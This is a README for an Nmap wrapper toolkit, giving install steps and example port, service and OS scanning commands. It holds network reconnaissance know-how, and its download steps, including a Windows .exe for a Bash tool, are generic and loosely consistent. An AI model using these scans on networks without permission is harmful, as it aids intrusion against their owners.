# 🚀 advanced-nmap-cli - Powerful Scanning Made Simple

[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-%20%F0%9F%93%95%20-blue.svg)](https://github.com/MahinTanzimSami/advanced-nmap-cli/releases)

## 📦 What is advanced-nmap-cli?

The **advanced-nmap-cli** is a powerful command-line toolkit designed for network scanning and security assessments. This tool enhances Nmap's capabilities by adding features such as:

- **NSE Automation:** Streamline network scripting engine usage.
- **Fuzzy Search (fzf):** Quickly find your desired results.
- **Script Debugging:** Identify and resolve issues in your scripts.
- **Telegram Notifications:** Get alerts sent directly to you during scans.
- **Comprehensive Penetration Testing Modes:** Choose from quick scans or thorough full-port scans.

Use this tool for service detection, OS detection, NSE pattern matching, and an interactive menu-driven workflow.

## 📈 Features

- **Quick Scans:** Efficiently check for open ports and basic services.
- **Full-Port Scans:** A complete assessment of all ports on your target.
- **Service Detection:** Identify version numbers and running services.
- **Operating System Detection:** Determine the OS of your target devices.
- **Interactive Menu:** User-friendly navigation for all your scanning needs.
- **Full Integration with Nmap:** Utilize the robust power of Nmap in your scanning.

## 🚀 Getting Started

### 1. System Requirements

Ensure you have the following installed on your machine:

- **Operating System:** Compatible with Windows, Mac, and Linux.
- **Nmap:** Version 7.80 or higher.
- **Bash Shell:** Optional but recommended for best experience.

### 2. Install Nmap (if not already installed)

To install Nmap:

- **For Windows:** Download the installer from [Nmap's official website](https://nmap.org/download.html).
- **For Mac:** Use Homebrew by running `brew install nmap` in your terminal.
- **For Linux:** Use your package manager. For example, on Ubuntu, run `sudo apt install nmap`.

### 3. Download advanced-nmap-cli

Visit this page to download: [Release Page](https://github.com/MahinTanzimSami/advanced-nmap-cli/releases)

## 📥 Download & Install

1. Go to the [Release Page](https://github.com/MahinTanzimSami/advanced-nmap-cli/releases).
2. Find the latest version listed.
3. Choose the appropriate file for your operating system:
   - For **Windows**, download the `.exe` file.
   - For **Mac/Linux**, download the `.sh` file.

4. Save the file to a convenient location on your computer.
  
### For Windows Users:
- Double-click the `.exe` file to start the installation process.
  
### For Mac/Linux Users:
- Open your terminal.
- Navigate to the folder where you saved the file. Use the `cd` command, for example:
  ```bash
  cd /path/to/your/downloaded/file/
  ```
- Make the script executable:
  ```bash
  chmod +x advanced-nmap-cli.sh
  ```
- Run the tool with:
  ```bash
  ./advanced-nmap-cli.sh
  ```

## ⚙️ How to Use

1. Open your command line interface (Terminal on Mac/Linux or Command Prompt/PowerShell on Windows).
2. Type `advanced-nmap-cli` followed by your desired options. For example:
   ```bash
   advanced-nmap-cli -sP 192.168.1.0/24
   ```
3. Follow the menu prompts to configure your scan settings.

### Example Usage
- **Quick Scan:**
  ```
  advanced-nmap-cli -sP [target IP or range]
  ```
- **Full-Port Scan:**
  ```
  advanced-nmap-cli -p- [target IP or range]
  ```
  
## 🔍 Troubleshooting

If you encounter issues:

- Ensure Nmap is correctly installed by running `nmap -v`.
- Check if the script has the necessary permissions (especially on Mac/Linux).
- Confirm you are targeting an active network address.

## 📣 Community & Support

For questions, issues, or suggestions, feel free to reach out:

- Open an issue on the [GitHub repository](https://github.com/MahinTanzimSami/advanced-nmap-cli/issues).
- Join discussions in the community forums related to cybersecurity and networking.

Feel free to contribute by submitting issues or suggesting features! 

For detailed guides on cybersecurity best practices and using advanced-nmap-cli in different scenarios, you can refer to our documentation within the repository.

## 📜 License

This project is licensed under the MIT License. See the LICENSE file for more details. 

---

Your journey into advanced network scanning begins here with the **advanced-nmap-cli**. Happy scanning!